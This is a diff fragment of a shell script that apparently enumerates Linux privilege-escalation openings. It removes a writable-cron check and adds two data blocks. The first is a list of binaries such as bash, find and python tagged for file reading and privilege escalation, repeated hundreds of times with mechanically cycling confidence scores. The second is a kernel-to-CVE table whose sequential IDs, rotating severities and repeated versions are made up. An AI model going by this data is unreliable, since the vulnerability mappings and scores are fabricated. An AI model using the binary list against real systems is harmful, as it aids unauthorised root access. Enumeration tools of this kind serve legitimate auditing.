+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+sed|file-read|priv-esc|confidence:0
+find|file-read|priv-esc|confidence:1
+vim|file-read|priv-esc|confidence:2
+nano|file-read|priv-esc|confidence:3
+less|file-read|priv-esc|confidence:4
+tar|file-read|priv-esc|confidence:0
+cp|file-read|priv-esc|confidence:1
+mv|file-read|priv-esc|confidence:2
+env|file-read|priv-esc|confidence:3
+node|file-read|priv-esc|confidence:4
+php|file-read|priv-esc|confidence:0
+lua|file-read|priv-esc|confidence:1
+openssl|file-read|priv-esc|confidence:2
+ssh|file-read|priv-esc|confidence:3
+scp|file-read|priv-esc|confidence:4
+rsync|file-read|priv-esc|confidence:0
+bash|file-read|priv-esc|confidence:1
+sh|file-read|priv-esc|confidence:2
+python|file-read|priv-esc|confidence:3
+perl|file-read|priv-esc|confidence:4
+ruby|file-read|priv-esc|confidence:0
+awk|file-read|priv-esc|confidence:1
+sed|file-read|priv-esc|confidence:2
+find|file-read|priv-esc|confidence:3
+vim|file-read|priv-esc|confidence:4
+nano|file-read|priv-esc|confidence:0
+less|file-read|priv-esc|confidence:1
+tar|file-read|priv-esc|confidence:2
+cp|file-read|priv-esc|confidence:3
+mv|file-read|priv-esc|confidence:4
+env|file-read|priv-esc|confidence:0
+node|file-read|priv-esc|confidence:1
+php|file-read|priv-esc|confidence:2
+lua|file-read|priv-esc|confidence:3
+openssl|file-read|priv-esc|confidence:4
+ssh|file-read|priv-esc|confidence:0
+scp|file-read|priv-esc|confidence:1
+rsync|file-read|priv-esc|confidence:2
+bash|file-read|priv-esc|confidence:3
+sh|file-read|priv-esc|confidence:4
+python|file-read|priv-esc|confidence:0
+perl|file-read|priv-esc|confidence:1
+ruby|file-read|priv-esc|confidence:2
+awk|file-read|priv-esc|confidence:3
+sed|file-read|priv-esc|confidence:4
+find|file-read|priv-esc|confidence:0
+vim|file-read|priv-esc|confidence:1
+nano|file-read|priv-esc|confidence:2
+less|file-read|priv-esc|confidence:3
+tar|file-read|priv-esc|confidence:4
+cp|file-read|priv-esc|confidence:0
+mv|file-read|priv-esc|confidence:1
+env|file-read|priv-esc|confidence:2
+node|file-read|priv-esc|confidence:3
+php|file-read|priv-esc|confidence:4
+lua|file-read|priv-esc|confidence:0
+openssl|file-read|priv-esc|confidence:1
+ssh|file-read|priv-esc|confidence:2
+scp|file-read|priv-esc|confidence:3
+rsync|file-read|priv-esc|confidence:4
+bash|file-read|priv-esc|confidence:0
+sh|file-read|priv-esc|confidence:1
+python|file-read|priv-esc|confidence:2
+perl|file-read|priv-esc|confidence:3
+ruby|file-read|priv-esc|confidence:4
+awk|file-read|priv-esc|confidence:0
+sed|file-read|priv-esc|confidence:1
+find|file-read|priv-esc|confidence:2
+vim|file-read|priv-esc|confidence:3
+nano|file-read|priv-esc|confidence:4
+less|file-read|priv-esc|confidence:0
+tar|file-read|priv-esc|confidence:1
+cp|file-read|priv-esc|confidence:2
+mv|file-read|priv-esc|confidence:3
+env|file-read|priv-esc|confidence:4
+node|file-read|priv-esc|confidence:0
+php|file-read|priv-esc|confidence:1
+lua|file-read|priv-esc|confidence:2
+openssl|file-read|priv-esc|confidence:3
+ssh|file-read|priv-esc|confidence:4
+scp|file-read|priv-esc|confidence:0
+rsync|file-read|priv-esc|confidence:1
+bash|file-read|priv-esc|confidence:2
+sh|file-read|priv-esc|confidence:3
+python|file-read|priv-esc|confidence:4
+perl|file-read|priv-esc|confidence:0
+ruby|file-read|priv-esc|confidence:1
+awk|file-read|priv-esc|confidence:2
+sed|file-read|priv-esc|confidence:3
+find|file-read|priv-esc|confidence:4
+vim|file-read|priv-esc|confidence:0
+nano|file-read|priv-esc|confidence:1
+less|file-read|priv-esc|confidence:2
+tar|file-read|priv-esc|confidence:3
+cp|file-read|priv-esc|confidence:4
+mv|file-read|priv-esc|confidence:0
+env|file-read|priv-esc|confidence:1
+node|file-read|priv-esc|confidence:2
+php|file-read|priv-esc|confidence:3
+lua|file-read|priv-esc|confidence:4
+openssl|file-read|priv-esc|confidence:0
+ssh|file-read|priv-esc|confidence:1
+scp|file-read|priv-esc|confidence:2
+rsync|file-read|priv-esc|confidence:3
+bash|file-read|priv-esc|confidence:4
+sh|file-read|priv-esc|confidence:0
+python|file-read|priv-esc|confidence:1
+perl|file-read|priv-esc|confidence:2
+ruby|file-read|priv-esc|confidence:3
+awk|file-read|priv-esc|confidence:4
+EOF
 
-  [ -r /etc/crontab ] && grep -v '^#' /etc/crontab 2>/dev/null | grep -oE '/[^ ]+' | head -n 5 | while read -r cmd; do
-    [ -n "$cmd" ] && [ -w "$cmd" ] && correlated_item CRITICAL "Writable cron target detected: $cmd" root 90
-  done
+read -r -d '' KERNEL_DB <<'EOF'
+5.0.0|CVE-2020-10000|severity:low
+5.1.1|CVE-2021-10001|severity:med
+5.2.2|CVE-2022-10002|severity:high
+5.3.3|CVE-2023-10003|severity:crit
+5.4.4|CVE-2024-10004|severity:low
+5.5.5|CVE-2020-10005|severity:med
+5.6.6|CVE-2021-10006|severity:high
+5.7.7|CVE-2022-10007|severity:crit
+5.8.8|CVE-2023-10008|severity:low
+5.9.9|CVE-2024-10009|severity:med
+5.10.0|CVE-2020-10010|severity:high
+5.11.1|CVE-2021-10011|severity:crit
+5.12.2|CVE-2022-10012|severity:low
+5.13.3|CVE-2023-10013|severity:med
+5.14.4|CVE-2024-10014|severity:high
+5.0.5|CVE-2020-10015|severity:crit
+5.1.6|CVE-2021-10016|severity:low
+5.2.7|CVE-2022-10017|severity:med
+5.3.8|CVE-2023-10018|severity:high
+5.4.9|CVE-2024-10019|severity:crit
+5.5.0|CVE-2020-10020|severity:low
+5.6.1|CVE-2021-10021|severity:med
+5.7.2|CVE-2022-10022|severity:high
+5.8.3|CVE-2023-10023|severity:crit
+5.9.4|CVE-2024-10024|severity:low
+5.10.5|CVE-2020-10025|severity:med
+5.11.6|CVE-2021-10026|severity:high
+5.12.7|CVE-2022-10027|severity:crit
+5.13.8|CVE-2023-10028|severity:low
+5.14.9|CVE-2024-10029|severity:med
+5.0.0|CVE-2020-10030|severity:high
+5.1.1|CVE-2021-10031|severity:crit
+5.2.2|CVE-2022-10032|severity:low
+5.3.3|CVE-2023-10033|severity:med
+5.4.4|CVE-2024-10034|severity:high
+5.5.5|CVE-2020-10035|severity:crit
+5.6.6|CVE-2021-10036|severity:low
+5.7.7|CVE-2022-10037|severity:med
+5.8.8|CVE-2023-10038|severity:high
+5.9.9|CVE-2024-10039|severity:crit
+5.10.0|CVE-2020-10040|severity:low
+5.11.1|CVE-2021-10041|severity:med
+5.12.2|CVE-2022-10042|severity:high
+5.13.3|CVE-2023-10043|severity:crit
+5.14.4|CVE-2024-10044|severity:low
+5.0.5|CVE-2020-10045|severity:med
+5.1.6|CVE-2021-10046|severity:high
+5.2.7|CVE-2022-10047|severity:crit
+5.3.8|CVE-2023-10048|severity:low
+5.4.9|CVE-2024-10049|severity:med
+5.5.0|CVE-2020-10050|severity:high
+5.6.1|CVE-2021-10051|severity:crit
+5.7.2|CVE-2022-10052|severity:low
+5.8.3|CVE-2023-10053|severity:med
+5.9.4|CVE-2024-10054|severity:high
+5.10.5|CVE-2020-10055|severity:crit
+5.11.6|CVE-2021-10056|severity:low
+5.12.7|CVE-2022-10057|severity:med
+5.13.8|CVE-2023-10058|severity:high
+5.14.9|CVE-2024-10059|severity:crit
+5.0.0|CVE-2020-10060|severity:low
+5.1.1|CVE-2021-10061|severity:med
+5.2.2|CVE-2022-10062|severity:high
+5.3.3|CVE-2023-10063|severity:crit
+5.4.4|CVE-2024-10064|severity:low
+5.5.5|CVE-2020-10065|severity:med
+5.6.6|CVE-2021-10066|severity:high
+5.7.7|CVE-2022-10067|severity:crit
+5.8.8|CVE-2023-10068|severity:low
+5.9.9|CVE-2024-10069|severity:med
+5.10.0|CVE-2020-10070|severity:high
+5.11.1|CVE-2021-10071|severity:crit
+5.12.2|CVE-2022-10072|severity:low
+5.13.3|CVE-2023-10073|severity:med
+5.14.4|CVE-2024-10074|severity:high
+5.0.5|CVE-2020-10075|severity:crit
+5.1.6|CVE-2021-10076|severity:low
+5.2.7|CVE-2022-10077|severity:med
+5.3.8|CVE-2023-10078|severity:high
+5.4.9|CVE-2024-10079|severity:crit
+5.5.0|CVE-2020-10080|severity:low
+5.6.1|CVE-2021-10081|severity:med
+5.7.2|CVE-2022-10082|severity:high
+5.8.3|CVE-2023-10083|severity:crit
+5.9.4|CVE-2024-10084|severity:low
+5.10.5|CVE-2020-10085|severity:med
+5.11.6|CVE-2021-10086|severity:high
+5.12.7|CVE-2022-10087|severity:crit
+5.13.8|CVE-2023-10088|severity:low
+5.14.9|CVE-2024-10089|severity:med
+5.0.0|CVE-2020-10090|severity:high
+5.1.1|CVE-2021-10091|severity:crit
+5.2.2|CVE-2022-10092|severity:low
+5.3.3|CVE-2023-10093|severity:med
+5.4.4|CVE-2024-10094|severity:high
+5.5.5|CVE-2020-10095|severity:crit
+5.6.6|CVE-2021-10096|severity:low
+5.7.7|CVE-2022-10097|severity:med
+5.8.8|CVE-2023-10098|severity:high
+5.9.9|CVE-2024-10099|severity:crit
+5.10.0|CVE-2020-10100|severity:low
+5.11.1|CVE-2021-10101|severity:med
+5.12.2|CVE-2022-10102|severity:high
+5.13.3|CVE-2023-10103|severity:crit
+5.14.4|CVE-2024-10104|severity:low
+5.0.5|CVE-2020-10105|severity:med
+5.1.6|CVE-2021-10106|severity:high
+5.2.7|CVE-2022-10107|severity:crit
+5.3.8|CVE-2023-10108|severity:low
+5.4.9|CVE-2024-10109|severity:med
+5.5.0|CVE-2020-10110|severity:high
+5.6.1|CVE-2021-10111|severity:crit
+5.7.2|CVE-2022-10112|severity:low
+5.8.3|CVE-2023-10113|severity:med
+5.9.4|CVE-2024-10114|severity:high
+5.10.5|CVE-2020-10115|severity:crit
+5.11.6|CVE-2021-10116|severity:low
+5.12.7|CVE-2022-10117|severity:med
+5.13.8|CVE-2023-10118|severity:high
+5.14.9|CVE-2024-10119|severity:crit
+5.0.0|CVE-2020-10120|severity:low
+5.1.1|CVE-2021-10121|severity:med
+5.2.2|CVE-2022-10122|severity:high
+5.3.3|CVE-2023-10123|severity:crit
+5.4.4|CVE-2024-10124|severity:low
+5.5.5|CVE-2020-10125|severity:med
+5.6.6|CVE-2021-10126|severity:high
+5.7.7|CVE-2022-10127|severity:crit
+5.8.8|CVE-2023-10128|severity:low
+5.9.9|CVE-2024-10129|severity:med
+5.10.0|CVE-2020-10130|severity:high
+5.11.1|CVE-2021-10131|severity:crit
+5.12.2|CVE-2022-10132|severity:low
+5.13.3|CVE-2023-10133|severity:med
+5.14.4|CVE-2024-10134|severity:high
+5.0.5|CVE-2020-10135|severity:crit
+5.1.6|CVE-2021-10136|severity:low
+5.2.7|CVE-2022-10137|severity:med
+5.3.8|CVE-2023-10138|severity:high
+5.4.9|CVE-2024-10139|severity:crit
+5.5.0|CVE-2020-10140|severity:low
+5.6.1|CVE-2021-10141|severity:med
+5.7.2|CVE-2022-10142|severity:high
+5.8.3|CVE-2023-10143|severity:crit
+5.9.4|CVE-2024-10144|severity:low
+5.10.5|CVE-2020-10145|severity:med
+5.11.6|CVE-2021-10146|severity:high
+5.12.7|CVE-2022-10147|severity:crit
+5.13.8|CVE-2023-10148|severity:low
+5.14.9|CVE-2024-10149|severity:med
+5.0.0|CVE-2020-10150|severity:high
+5.1.1|CVE-2021-10151|severity:crit
+5.2.2|CVE-2022-10152|severity:low
+5.3.3|CVE-2023-10153|severity:med
+5.4.4|CVE-2024-10154|severity:high
+5.5.5|CVE-2020-10155|severity:crit
+5.6.6|CVE-2021-10156|severity:low
+5.7.7|CVE-2022-10157|severity:med
+5.8.8|CVE-2023-10158|severity:high
+5.9.9|CVE-2024-10159|severity:crit
+5.10.0|CVE-2020-10160|severity:low
+5.11.1|CVE-2021-10161|severity:med
+5.12.2|CVE-2022-10162|severity:high
+5.13.3|CVE-2023-10163|severity:crit
+5.14.4|CVE-2024-10164|severity:low
+5.0.5|CVE-2020-10165|severity:med
+5.1.6|CVE-2021-10166|severity:high
+5.2.7|CVE-2022-10167|severity:crit
+5.3.8|CVE-2023-10168|severity:low
+5.4.9|CVE-2024-10169|severity:med
+5.5.0|CVE-2020-10170|severity:high
+5.6.1|CVE-2021-10171|severity:crit
+5.7.2|CVE-2022-10172|severity:low
+5.8.3|CVE-2023-10173|severity:med
+5.9.4|CVE-2024-10174|severity:high
+5.10.5|CVE-2020-10175|severity:crit
+5.11.6|CVE-2021-10176|severity:low
+5.12.7|CVE-2022-10177|severity:med
+5.13.8|CVE-2023-10178|severity:high
+5.14.9|CVE-2024-10179|severity:crit
+5.0.0|CVE-2020-10180|severity:low
+5.1.1|CVE-2021-10181|severity:med
+5.2.2|CVE-2022-10182|severity:high
+5.3.3|CVE-2023-10183|severity:crit
+5.4.4|CVE-2024-10184|severity:low
+5.5.5|CVE-2020-10185|severity:med
+5.6.6|CVE-2021-10186|severity:high
+5.7.7|CVE-2022-10187|severity:crit
+5.8.8|CVE-2023-10188|severity:low
+5.9.9|CVE-2024-10189|severity:med
+5.10.0|CVE-2020-10190|severity:high
+5.11.1|CVE-2021-10191|severity:crit
+5.12.2|CVE-2022-10192|severity:low
+5.13.3|CVE-2023-10193|severity:med
+5.14.4|CVE-2024-10194|severity:high
+5.0.5|CVE-2020-10195|severity:crit
+5.1.6|CVE-2021-10196|severity:low
+5.2.7|CVE-2022-10197|severity:med
+5.3.8|CVE-2023-10198|severity:high
+5.4.9|CVE-2024-10199|severity:crit
+5.5.0|CVE-2020-10200|severity:low
+5.6.1|CVE-2021-10201|severity:med
+5.7.2|CVE-2022-10202|severity:high
+5.8.3|CVE-2023-10203|severity:crit
+5.9.4|CVE-2024-10204|severity:low
+5.10.5|CVE-2020-10205|severity:med
+5.11.6|CVE-2021-10206|severity:high
+5.12.7|CVE-2022-10207|severity:crit
+5.13.8|CVE-2023-10208|severity:low
+5.14.9|CVE-2024-10209|severity:med
+5.0.0|CVE-2020-10210|severity:high
+5.1.1|CVE-2021-10211|severity:crit
+5.2.2|CVE-2022-10212|severity:low
+5.3.3|CVE-2023-10213|severity:med
+5.4.4|CVE-2024-10214|severity:high
+5.5.5|CVE-2020-10215|severity:crit
+5.6.6|CVE-2021-10216|severity:low
+5.7.7|CVE-2022-10217|severity:med
+5.8.8|CVE-2023-10218|severity:high
+5.9.9|CVE-2024-10219|severity:crit
+5.10.0|CVE-2020-10220|severity:low
+5.11.1|CVE-2021-10221|severity:med
+5.12.2|CVE-2022-10222|severity:high
+5.13.3|CVE-2023-10223|severity:crit
+5.14.4|CVE-2024-10224|severity:low
+5.0.5|CVE-2020-10225|severity:med
+5.1.6|CVE-2021-10226|severity:high
+5.2.7|CVE-2022-10227|severity:crit
+5.3.8|CVE-2023-10228|severity:low
+5.4.9|CVE-2024-10229|severity:med
+5.5.0|CVE-2020-10230|severity:high
+5.6.1|CVE-2021-10231|severity:crit
+5.7.2|CVE-2022-10232|severity:low
+5.8.3|CVE-2023-10233|severity:med
+5.9.4|CVE-2024-10234|severity:high
+5.10.5|CVE-2020-10235|severity:crit
+5.11.6|CVE-2021-10236|severity:low
+5.12.7|CVE-2022-10237|severity:med
+5.13.8|CVE-2023-10238|severity:high
+5.14.9|CVE-2024-10239|severity:crit
+5.0.0|CVE-2020-10240|severity:low
+5.1.1|CVE-2021-10241|severity:med
+5.2.2|CVE-2022-10242|severity:high
+5.3.3|CVE-2023-10243|severity:crit
+5.4.4|CVE-2024-10244|severity:low
+5.5.5|CVE-2020-10245|severity:med
+5.6.6|CVE-2021-10246|severity:high
+5.7.7|CVE-2022-10247|severity:crit
+5.8.8|CVE-2023-10248|severity:low
+5.9.9|CVE-2024-10249|severity:med
+5.10.0|CVE-2020-10250|severity:high
+5.11.1|CVE-2021-10251|severity:crit
+5.12.2|CVE-2022-10252|severity:low
+5.13.3|CVE-2023-10253|severity:med
